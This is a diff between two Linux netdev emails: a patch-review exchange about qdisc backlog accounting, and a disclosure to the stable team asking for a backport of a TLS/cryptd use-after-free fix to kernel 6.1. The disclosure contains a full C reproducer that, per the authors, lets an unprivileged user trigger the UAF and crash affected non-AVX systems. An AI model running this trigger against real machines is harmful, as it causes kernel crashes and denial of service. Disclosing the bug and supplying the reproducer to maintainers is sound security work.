@@ -1,43 +1,39 @@
 Received: from mail-10625.protonmail.ch (mail-10625.protonmail.ch [79.135.106.25])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 586D029BD9C
-	for <netdev@vger.kernel.org>; Mon, 11 Aug 2025 16:53:01 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 00D1A29BDB3
+	for <netdev@vger.kernel.org>; Mon, 11 Aug 2025 17:03:53 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=79.135.106.25
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1754931184; cv=none; b=jkxoZAx0XVHNGzLBFCLtzgJ4bB8VKk5AAFC5MkHxNQgKWQXQVmxyn2QA0oe0XrGf52hTRFbPb3DXRTgryZ8JkSmTRaSjfqzPB6WvObQk6i8lsFFMcBLO0nrTfkDeeoQlXipy7DUAv6VvWJH+L70d9KlVTPkybgmk9tfPy/DffXM=
+	t=1754931835; cv=none; b=l9uLKOf4zBKswEs6XlVO+44TXw686k7mZ2uQWtG8Rnn5wSk8vr7WuHAxNi3xRwlFkPhjz1iggWlMN1J3klfRGyaBXHT/Z12p+Bohxolh8BySva5PocTY5p1sdG+Fst9zvy+cwTV76oRHPjOf8eHBG6OCB/52ZEDPVnZcBbLjLN4=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1754931184; c=relaxed/simple;
-	bh=5QndF160GCFjm7dIrzvsXDNlVlzG62tPwVmfhncnrN4=;
-	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=pqC5AihyWxPhtBFq79yRondaw/nCp1FNCoQbM0yTnSSNe7doRkoaBQoV8X6UGGtI0F5Q9DIjIanHJ97LYfl2IsaFoe+lufVMEfMC22g/JcBH1V5kDwkGB8/mClkbQtVm2zw1uFG/D5rdRlXYZbYE+7NxQIAaSXft18p3n5RWJSA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=willsroot.io; spf=pass smtp.mailfrom=willsroot.io; dkim=pass (2048-bit key) header.d=willsroot.io header.i=@willsroot.io header.b=WRceLz0X; arc=none smtp.client-ip=79.135.106.25
+	s=arc-20240116; t=1754931835; c=relaxed/simple;
+	bh=7cUKkyYHTauJlJoSDm7aQ6chUaavvGuupfo85YrXibM=;
+	h=Date:To:From:Cc:Subject:Message-ID:MIME-Version:Content-Type; b=nQYd5aOzJX6jEm5vwpuKjnTC0v/PGAB82lqhv60RYjBKa2bc6B/xHag44eOKz0BiXR0On5RvNWO7uWbP5T5+kuOKLR0uKw0J1qJ1ZpwluPS9fhNgcEZnrSRWNLvLMOWv7hk5FTNds61YA9kzWalofTyw+mKnVhEhtmfYEFQcsVA=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=willsroot.io; spf=pass smtp.mailfrom=willsroot.io; dkim=pass (2048-bit key) header.d=willsroot.io header.i=@willsroot.io header.b=P7khkwGU; arc=none smtp.client-ip=79.135.106.25
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=willsroot.io
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=willsroot.io
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=willsroot.io header.i=@willsroot.io header.b="WRceLz0X"
+	dkim=pass (2048-bit key) header.d=willsroot.io header.i=@willsroot.io header.b="P7khkwGU"
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=willsroot.io;
-	s=protonmail2; t=1754931178; x=1755190378;
-	bh=5QndF160GCFjm7dIrzvsXDNlVlzG62tPwVmfhncnrN4=;
-	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
-	 Feedback-ID:From:To:Cc:Date:Subject:Reply-To:Feedback-ID:
-	 Message-ID:BIMI-Selector;
-	b=WRceLz0X+V799SzM24EsebUM2VTRK3emDCD8LtIjWRzGW/0cQD2Xq3vIzQ1bP4mPJ
-	 X/xuKviWmd27AMX5mFxEStisyqBjRRd0qwyH6SfADnDIB6lKRjLuQXWrGa3fc8WQi9
-	 0ex7Ufl3CYO+WLC/FPZ6dYt7p3tifCPIg1543Ot5/AjxKguFMxs5TQX9Ksh4VM5ed5
-	 w6/t1x8p8azKWFan0nJbWZ6qY4yb3Y7r78kl4hwWTBQAlwXaLJHYM1LHzcWTWoBhBY
-	 RX/G/pOm/dA8cxSQ44okjBrZNHDWgZVWdP9TzmuT7S0kEwSe9QDJfv2lyNJaoBv2F0
-	 aSlHBCJG1zsrg==
-Date: Mon, 11 Aug 2025 16:52:51 +0000
-To: Jakub Kicinski <kuba@kernel.org>
+	s=protonmail2; t=1754931831; x=1755191031;
+	bh=HT42lsSm+IZ/cej5rhvGMCIS35tYGM41VbPIooh0P6c=;
+	h=Date:To:From:Cc:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
+	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
+	b=P7khkwGUIh6ZWyzdGyKgnt+68umFQs7P9CjR9YiK5NcGf4jCEr5sudEr1EB39NpBK
+	 roiyvbd4RfiTbT3Hqm1O4ZizL/qVr8GDn4OIUaAEB42RwfRGqJRk4b5CFfMistIaYs
+	 mWyLlx3GuyLhoQy1hOBKVHQT9yNsxktplLsK6YqXvD4TKcHrh1ig+gJ+1KIg1aPsQu
+	 1wEW6WPqpGH+2GNUlfBDPWsOeaAXD0cCbjSpuGLU+maCjXDa4iKrmpcfL4J+D6q2iM
+	 26IFXxjvBvc7cN4dzA9zqDFKd3LTgHvNP6HzQrg0VVZMA2PwWUeaWTG+HjnUgybT8g
+	 Bk2wHD7m9JRGA==
+Date: Mon, 11 Aug 2025 17:03:47 +0000
+To: "stable@vger.kernel.org" <stable@vger.kernel.org>
 From: William Liu <will@willsroot.io>
-Cc: netdev@vger.kernel.org, jhs@mojatatu.com, xiyou.wangcong@gmail.com, pabeni@redhat.com, jiri@resnulli.us, davem@davemloft.net, edumazet@google.com, horms@kernel.org, savy@syst3mfailure.io, victor@mojatatu.com
-Subject: Re: [PATCH net v4 1/2] net/sched: Fix backlog accounting in qdisc_dequeue_internal
-Message-ID: <-8f3jdd-5pxHr0GW-uu8VtTzqDKDOyJohJ-soIwzRyqJUub186VYIxqNoGOTh8Oxtu1U0CEDl5h3N1c1D1jbn7nIlXUrNo55CHK5KcT23c4=@willsroot.io>
-In-Reply-To: <20250811082958.489df3fa@kernel.org>
-References: <20250727235602.216450-1-will@willsroot.io> <20250808142746.6b76eae1@kernel.org> <n-GjVW0_1R1-ujkLgZIEgnaQKSsNtQ9-7UZiTmDCJsy1EutoUtiGOSahNSxpz2yANsp5olbxItT2X9apTC9btIRepMGAZZVBqWx6ueYE5O4=@willsroot.io> <20250811082958.489df3fa@kernel.org>
+Cc: "sd@queasysnail.net" <sd@queasysnail.net>, Jakub Kicinski <kuba@kernel.org>, "netdev@vger.kernel.org" <netdev@vger.kernel.org>, Savy <savy@syst3mfailure.io>, "john.fastabend@gmail.com" <john.fastabend@gmail.com>, "borisp@nvidia.com" <borisp@nvidia.com>
+Subject: [BUG] Missing backport for UAF fix in interaction between tls_decrypt_sg and cryptd_queue_worker
+Message-ID: <he2K1yz_u7bZ-CnYcTSQ4OxuLuHZXN6xZRgp6_ICSWnq8J5FpI_uD1i_1lTSf7WMrYb5ThiX1OR2GTOB2IltgT49Koy7Hhutr4du4KtLvyk=@willsroot.io>
 Feedback-ID: 42723359:user:proton
-X-Pm-Message-ID: 3facedebffe56d11f53a89d3a8cf097286c279f2
+X-Pm-Message-ID: d0069bd53d5739e83984cc5f94c0b732173af8b5
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -47,112 +43,145 @@ MIME-Version: 1.0
 Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: quoted-printable
 
-On Monday, August 11th, 2025 at 3:30 PM, Jakub Kicinski <kuba@kernel.org> w=
-rote:
+Hi all,
 
->=20
->=20
-> On Sun, 10 Aug 2025 21:06:57 +0000 William Liu wrote:
->=20
-> > > On Sun, 27 Jul 2025 23:56:32 +0000 William Liu wrote:
-> > >=20
-> > > > Special care is taken for fq_codel_dequeue to account for the
-> > > > qdisc_tree_reduce_backlog call in its dequeue handler. The
-> > > > cstats reset is moved from the end to the beginning of
-> > > > fq_codel_dequeue, so the change handler can use cstats for
-> > > > proper backlog reduction accounting purposes. The drop_len and
-> > > > drop_count fields are not used elsewhere so this reordering in
-> > > > fq_codel_dequeue is ok.
-> > >=20
-> > > Using local variables like we do in other qdiscs will not work?
-> > > I think your change will break drop accounting during normal dequeue?
-> >=20
-> > Can you elaborate on this?
-> >=20
-> > I just moved the reset of two cstats fields from the dequeue handler
-> > epilogue to the prologue. Those specific cstats fields are not used
-> > elsewhere so they should be fine,
->=20
->=20
-> That's the disconnect. AFAICT they are passed to codel_dequeue(),
-> and will be used during normal dequeue, as part of normal active
-> queue management under traffic..
->=20
+Commit 41532b785e (tls: separate no-async decryption request handling from =
+async) [1] actually covers a UAF read and write bug in the kernel, and shou=
+ld be backported to 6.1. As of now, it has only been backported to 6.6, bac=
+k from the time when the patch was committed. The commit mentions a non-rep=
+roducible UAF that was previously observed, but we managed to hit the vulne=
+rable case.
 
-Yes, that is the only place those values are used. From my understanding, c=
-odel_dequeue is only called in fq_codel_dequeue. So moving the reset from t=
-he dequeue epilogue to the dequeue prologue should be fine as the same beha=
-vior is kept - the same values should always be used by codel_dequeue.
+The vulnerable case is when a user wraps an existing crypto algorithm (such=
+ as gcm or ghash) in cryptd. By default, cryptd-wrapped algorithms have a h=
+igher priority than the base variant. tls_decrypt_sg allocates the aead req=
+uest, and triggers the crypto handling with tls_do_decryption. When the cry=
+pto is handled by cryptd, it gets dispatched to a worker that handles it an=
+d initially returns EINPROGRESS. While older LTS versions (5.4, 5.10, and 5=
+.15) seem to have an additional crypto_wait_req call in those cases, 6.1 ju=
+st returns success and frees the aead request. The cryptd worker could stil=
+l be operating in this case, which causes a UAF.=20
 
-Is there a case I am not seeing? If so, I can just add additional fields to=
- the fq_codel_sched_data, but wanted to avoid doing that for this one edge =
-case.
+However, this vulnerability only occurs when the CPU is without AVX support=
+ (perhaps this is why there were reproducibility difficulties). With AVX, a=
+esni_init calls simd_register_aeads_compat to force the crypto subsystem to=
+ use the SIMD version and avoids the async issues raised by cryptd. While I=
+ doubt many people are using host systems without AVX these days, this envi=
+ronment is pretty common in VMs when QEMU uses KVM without using the "-cpu =
+host" flag.
 
-> > but we need to accumulate their
-> > values during limit adjustment. Otherwise the limit adjustment loop
-> > could perform erroneous accounting in the final
-> > qdisc_tree_reduce_backlog because the dequeue path could have already
-> > triggered qdisc_tree_reduce_backlog calls.
-> >=20
-> > > > diff --git a/net/sched/sch_fq.c b/net/sched/sch_fq.c
-> > > > index 902ff5470607..986e71e3362c 100644
-> > > > --- a/net/sched/sch_fq.c
-> > > > +++ b/net/sched/sch_fq.c
-> > > > @@ -1014,10 +1014,10 @@ static int fq_change(struct Qdisc *sch, str=
-uct nlattr *opt,
-> > > > struct netlink_ext_ack *extack)
-> > > > {
-> > > > struct fq_sched_data *q =3D qdisc_priv(sch);
-> > > > + unsigned int prev_qlen, prev_backlog;
-> > > > struct nlattr *tb[TCA_FQ_MAX + 1];
-> > > > - int err, drop_count =3D 0;
-> > > > - unsigned drop_len =3D 0;
-> > > > u32 fq_log;
-> > > > + int err;
-> > > >=20
-> > > > err =3D nla_parse_nested_deprecated(tb, TCA_FQ_MAX, opt, fq_policy,
-> > > > NULL);
-> > > > @@ -1135,16 +1135,16 @@ static int fq_change(struct Qdisc *sch, str=
-uct nlattr *opt,
-> > > > err =3D fq_resize(sch, fq_log);
-> > > > sch_tree_lock(sch);
-> > > > }
-> > > > +
-> > > > + prev_qlen =3D sch->q.qlen;
-> > > > + prev_backlog =3D sch->qstats.backlog;
-> > > > while (sch->q.qlen > sch->limit) {
-> > > > struct sk_buff *skb =3D qdisc_dequeue_internal(sch, false);
-> > > >=20
-> > > > - if (!skb)
-> > > > - break;
-> > >=20
-> > > The break conditions is removed to align the code across the qdiscs?
-> >=20
-> > That break is no longer needed because qdisc_internal_dequeue handles
-> > all the length and backlog size adjustments. The check existed there
-> > because of the qdisc_pkt_len call.
->=20
->=20
-> Ack, tho, theoretically the break also prevents an infinite loop.
-> Change is fine, but worth calling this out in the commit message,
-> I reckon.
->=20
-> > > > - drop_len +=3D qdisc_pkt_len(skb);
-> > > > rtnl_kfree_skbs(skb, skb);
-> > > > - drop_count++;
-> > > > }
-> > > > - qdisc_tree_reduce_backlog(sch, drop_count, drop_len);
-> > > > + qdisc_tree_reduce_backlog(sch, prev_qlen - sch->q.qlen,
-> > > > + prev_backlog - sch->qstats.backlog);
-> > >=20
-> > > There is no real change in the math here, right?
-> > > Again, you're just changing this to align across the qdiscs?
-> >=20
-> > Yep, asides from using a properly updated qlen and backlog from the
-> > revamped qdisc_dequeue_internal.
->=20
->=20
-> Personal preference, but my choice would be to follow the FQ code,
-> and count the skbs as they are freed. But up to you, since we hold
-> the lock supposedly the changes to backlog can only be due to our
-> purging.
+The following is a repro, and can be triggered from unprivileged users. Mul=
+tishot KASAN shows multiple UAF reads and writes, and ends up panicking the=
+ system with a null dereference.
+
+#define _GNU_SOURCE
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <string.h>
+#include <unistd.h>
+#include <sched.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <linux/tcp.h>
+#include <linux/tls.h>
+#include <sys/resource.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <linux/if_alg.h>
+#include <signal.h>
+#include <sys/wait.h>
+#include <time.h>
+
+struct tls_conn {
+    int tx;
+    int rx;
+};
+
+void tls_enable(int sk, int type) {
+    struct tls12_crypto_info_aes_gcm_256 tls_ci =3D {
+        .info.version =3D TLS_1_3_VERSION,
+        .info.cipher_type =3D TLS_CIPHER_AES_GCM_256,
+    };
+
+    setsockopt(sk, IPPROTO_TCP, TCP_ULP, "tls", sizeof("tls"));
+    setsockopt(sk, SOL_TLS, type, &tls_ci, sizeof(tls_ci));
+}
+
+struct tls_conn *tls_create_conn(int port) {
+    int s0 =3D socket(AF_INET, SOCK_STREAM, 0);
+    int s1 =3D socket(AF_INET, SOCK_STREAM, 0);
+
+    struct sockaddr_in a =3D {
+        .sin_family =3D AF_INET,
+        .sin_port =3D htons(port),
+        .sin_addr =3D htobe32(0),
+    };
+
+    bind(s0, (struct sockaddr*)&a, sizeof(a));
+    listen(s0, 1);
+    connect(s1, (struct sockaddr *)&a, sizeof(a));
+    int s2 =3D accept(s0, 0, 0);
+    close(s0);
+   =20
+    tls_enable(s1, TLS_TX);
+    tls_enable(s2, TLS_RX);
+
+    struct tls_conn *t =3D calloc(1, sizeof(struct tls_conn));
+
+    t->tx =3D s1;
+    t->rx =3D s2;
+
+    return t;
+}
+
+void tls_destroy_conn(struct tls_conn *t) {
+    close(t->tx);
+    close(t->rx);
+    free(t);
+}
+
+int tls_send(struct tls_conn *t, char *data, size_t size) {
+    return sendto(t->tx, data, size, 0, NULL, 0);
+}
+
+int tls_recv(struct tls_conn *t, char *data, size_t size) {
+    return recvfrom(t->rx, data, size, 0, NULL, NULL);
+}
+
+int crypto_register_algo(char *type, char *name) {
+   =20
+    int s =3D socket(AF_ALG, SOCK_SEQPACKET, 0);
+
+    struct sockaddr_alg sa =3D {};
+
+    sa.salg_family =3D AF_ALG;
+    strcpy(sa.salg_type, type);
+    strcpy(sa.salg_name, name);
+
+    bind(s, (struct sockaddr *)&sa, sizeof(sa));
+    close(s);
+   =20
+    return 0;
+}
+
+int main(void) {
+    char buff[0x2000];
+    crypto_register_algo("aead", "cryptd(gcm(aes))");
+    struct tls_conn *t =3D tls_create_conn(20000);
+    tls_send(t, buff, 0x10);
+    tls_recv(t, buff, 0x100);
+}
+
+Feel free to let us know if you have any questions and if there is anything=
+ else we can do to help.
+
+Best,
+Will
+Savy
+
+[1] https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/comm=
+it/?id=3D41532b785e9d79636b3815a64ddf6a096647d011
